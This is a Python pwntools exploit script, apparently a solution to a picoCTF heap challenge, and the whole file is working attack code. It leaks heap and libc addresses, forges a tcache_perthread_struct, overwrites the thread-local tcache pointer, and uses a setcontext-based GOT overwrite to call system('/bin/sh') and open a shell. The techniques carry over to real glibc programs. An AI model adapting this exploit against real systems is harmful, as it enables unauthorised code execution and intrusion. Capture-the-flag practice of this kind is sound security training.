#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("./hft_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

sock = conn = process()
# sock = conn = remote("tethys.picoctf.net", 57462)

# Note: this solve I found after solving the challenge used the same strategy to leak heap and libc.
#       However, it uses an alternative approach to pop a shell by using `setcontext` which is very interesting.
#       The link for this solve is this: https://eth007.me/blog/posts/high-frequency-troubles/

def send_ping(content, sz):
    sock.recvuntil(b"PKT_RES")
    sock.send(p32(sz))
    sock.sendline(p32(0) + p64(0) + content)

def send_echo(content, sz, end=True) :
    sock.recvuntil(b"PKT_RES")
    sock.send(p32(sz))
    if len(content) != 0:
      payload = p32(0) + p64(1) + content
    else:
      payload = p32(0) + b'\x01\0\0\0\0\0'
    sock.sendline(payload)

send_echo(b"", 0x10)
send_echo(b"a"*8 + p64(0xd31), 0x10)
send_echo(b"b"*0xf00, 0x1000)
send_echo(b"", 0x8)
conn.recvuntil(b":[")
leak = u64(conn.recv(6) + b"\0\0")
info("heap leak: " + hex(leak))

payload = b"a"*(8*6) # counts in tcache_perthread_struct (not really relevant, just not 0)
payload += p64(leak-8*4+0x30+0xa0) # 0x20 bin (location of libc address)
payload += p64(leak+0x30) # 0x30 bin
payload += p64(leak+0x30) # 0x40 bin
payload += p64(leak+0x30) # 0x50 bin
payload += p64(leak+0x30) # 0x60 bin
payload += p64(leak+0x30) # 0x70 bin
send_echo(payload, 0x80) # new tcache perthread struct

gdb.attach(conn)
input("GO!")

send_echo(b"a\0a" + b"a"*(0x10000-3)+b"b"*(136920) + p64(leak-0x10), 0x30001) # overwrite tls pointer to tcache_perthread_struct

send_echo(b"", 0x10) # allocate over libc address
conn.recvuntil(b":[")
libcleak = u64(conn.recv(6) + b"\0\0")
libc.address = libcleak - 0x21a280 - 0x60
info("libc @ " + hex(libc.address))

def create_ucontext(
    src: int,
    rsp=0,
    rbx=0,
    rbp=0,
    r12=0,
    r13=0,
    r14=0,
    r15=0,
    rsi=0,
    rdi=0,
    rcx=0,
    r8=0,
    r9=0,
    rdx=0,
    rip=0xDEADBEEF,
) -> bytearray:
    b = bytearray(0x200)
    b[0xE0:0xE8] = p64(src)  # fldenv ptr
    b[0x1C0:0x1C8] = p64(0x1F80)  # ldmxcsr

    b[0xA0:0xA8] = p64(rsp)
    b[0x80:0x88] = p64(rbx)
    b[0x78:0x80] = p64(rbp)
    b[0x48:0x50] = p64(r12)
    b[0x50:0x58] = p64(r13)
    b[0x58:0x60] = p64(r14)
    b[0x60:0x68] = p64(r15)

    b[0xA8:0xB0] = p64(rip)  # ret ptr
    b[0x70:0x78] = p64(rsi)
    b[0x68:0x70] = p64(rdi)
    b[0x98:0xA0] = p64(rcx)
    b[0x28:0x30] = p64(r8)
    b[0x30:0x38] = p64(r9)
    b[0x88:0x90] = p64(rdx)

    return b

def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt_trampoline = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    return got, flat(
        p64(0),
        p64(got + 0x218),
        p64(libc.symbols["setcontext"] + 32),
        p64(plt_trampoline) * 0x40,
        create_ucontext(got + 0x218, rsp=libc.symbols["environ"] + 8, **kwargs),
    )

dest, pl = setcontext32(
             libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()
           )

def send_raw(content, sz, end=True) :
    sock.recvuntil(b"PKT_RES")
    sock.send(p64(sz))
    payload = content
    sock.sendline(payload)

payload = b"a"*(8*6)
payload += p64(dest)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
send_echo(payload, 0x50) # new tcache_perthread_struct

send_raw(pl[8:], 0)

conn.interactive()

